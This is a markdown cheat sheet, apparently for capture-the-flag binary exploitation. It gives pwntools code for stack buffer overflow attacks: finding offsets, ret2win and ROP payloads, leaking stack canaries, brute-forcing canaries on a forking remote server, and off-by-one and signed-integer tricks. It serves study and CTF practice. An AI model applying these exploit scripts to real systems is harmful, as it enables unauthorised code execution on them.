# Stack Buffer Overflow

## Offset Discovery
```python
# IN: binary path  OUT: offset to saved RIP
from pwn import *
p = process('./binary')
p.sendline(cyclic(200))
p.wait()
core = Coredump('./core')  # or parse crash from GDB
offset = cyclic_find(core.fault_addr & 0xFFFFFFFF)
assert 0 < offset < 200
```
**GDB alternative**: `run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")` then `cyclic -l $rip` (pwndbg/GEF).

## ret2win
**When**: a `win`/`flag`/`shell` function exists in the binary.
```python
# IN: binary path, offset  OUT: interactive shell or flag
from pwn import *
context.binary = elf = ELF('./binary')
p = process('./binary')
payload = b'A' * offset + p64(elf.sym['win'])
p.sendline(payload)
p.interactive()
```

## Stack Alignment (x86-64)
**Trap**: `movaps` in libc crashes if RSP is not 16-byte aligned at CALL. Fix: insert a `ret` gadget before the target.
```python
ret = ROP(elf).find_gadget(['ret'])[0]
payload = b'A' * offset + p64(ret) + p64(elf.sym['win'])
```

## ret2win with Arguments
```python
# IN: binary path, offset, arg values  OUT: shell/flag
from pwn import *
context.binary = elf = ELF('./binary')
rop = ROP(elf)
rop.call(elf.sym['win'], [0xdeadbeef, 0xcafebabe])
p = process('./binary')
p.sendline(b'A' * offset + rop.chain())
p.interactive()
```

## Canary Leak (Format String)
**When**: format string vuln exists before the overflow.
```python
# IN: canary stack offset (find empirically)  OUT: canary value
p.sendline(b'%15$p')  # adjust offset
canary = int(p.recvline(), 16)
payload = b'A' * canary_offset + p64(canary) + b'A' * 8 + p64(target)
```

## Canary Brute-Force (Forking Server)
**When**: server `fork()`s — child inherits canary. | **Trap**: null byte is always the first canary byte.
```python
# IN: host, port, canary_offset  OUT: 8-byte canary
canary = b'\x00'
for pos in range(1, 8):
    for guess in range(256):
        p = remote(host, port)
        p.send(b'A' * canary_offset + canary + bytes([guess]))
        try:
            p.recv(timeout=0.5)
            canary += bytes([guess]); p.close(); break
        except: p.close()
assert len(canary) == 8
```

## Off-by-One (Saved RBP)
**When**: overflow overwrites only the LSB of saved RBP.
On `leave; ret`, RSP moves to the corrupted RBP → attacker-controlled stack frame. Requires that `[new_rbp + 8]` (the next return address) points to controllable data.

## Signed Integer Bypass
**When**: size check uses `int` comparison but `memcpy` treats size as `unsigned`.
Negative values pass `if (size > MAX)` but wrap to huge unsigned values. Send a negative size to trigger overflow.
